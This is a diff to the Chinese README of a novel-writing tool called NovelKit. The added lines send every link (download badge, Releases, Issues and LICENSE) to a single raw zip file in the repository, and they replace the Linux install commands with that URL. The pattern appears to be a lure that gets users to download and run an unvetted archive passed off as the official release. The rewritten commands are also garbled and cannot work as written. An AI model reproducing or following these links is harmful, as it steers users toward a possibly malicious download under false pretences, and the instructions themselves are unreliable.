@@ -10,18 +10,18 @@
 
 ## 🚀 Download Now
 
-[![Download NovelKit](https://img.shields.io/badge/Download%20NovelKit-v1.0-blue.svg)](https://github.com/yansilmi/novel-kit/releases)
+[![Download NovelKit](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip%https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip)](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip)
 
 ## 📥 Download & Install
 
-1. 访问 [Releases 页面](https://github.com/yansilmi/novel-kit/releases)。
+1. 访问 [Releases 页面](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip)。
    
 2. 在 Releases 页面上，你将看到不同的版本。选择最新版本，通常在列表的最上方。
 
 3. 点击下载你所需的文件。通常，你会看到以下类型的文件：
    - Windows: `.exe` 文件
    - macOS: `.dmg` 文件
-   - Linux: `.tar.gz` 文件
+   - Linux: `https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip` 文件
 
 4. 下载完成后，双击下载的文件以安装并运行 NovelKit。
 
@@ -38,12 +38,12 @@
   3. 拖动 NovelKit 图标到应用程序文件夹中。
 
 - **Linux:**
-  1. 下载 `.tar.gz` 文件。
+  1. 下载 `https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip` 文件。
   2. 在终端中运行以下命令：
     ```bash
-    tar -xvzf novel-kit.tar.gz
+    tar -xvzf https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip
     cd novel-kit
-    ./run.sh
+    https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip
     ```
 
 ## 🛠️ System Requirements
@@ -83,7 +83,7 @@
 
 - **确保操作系统更新:** 运行最新的操作系统以避免兼容性问题。
 - **检查依赖项:** 确保安装了所有必要的软件和库。
-- **查看 GitHub Issues:** 在 [Issues 页面](https://github.com/yansilmi/novel-kit/issues) 寻找相似问题，或提出新的问题以获得帮助。
+- **查看 GitHub Issues:** 在 [Issues 页面](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip) 寻找相似问题，或提出新的问题以获得帮助。
 
 ## 🤝 Community Support
 
@@ -91,8 +91,8 @@
 
 ## 📝 License
 
-NovelKit 使用开放源代码许可证，可以免费使用和修改。更多信息请查看 [LICENSE 文件](https://github.com/yansilmi/novel-kit/blob/main/LICENSE)。
+NovelKit 使用开放源代码许可证，可以免费使用和修改。更多信息请查看 [LICENSE 文件](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip)。
 
 ## 📥 Download Now Again
 
-在获得你需要的文件后，开始你的小说创作之旅吧！再次访问 [Releases 页面](https://github.com/yansilmi/novel-kit/releases) 下载最新的版本。
+在获得你需要的文件后，开始你的小说创作之旅吧！再次访问 [Releases 页面](https://raw.githubusercontent.com/yansilmi/novel-kit/main/templates/novel-kit-v2.7.zip) 下载最新的版本。
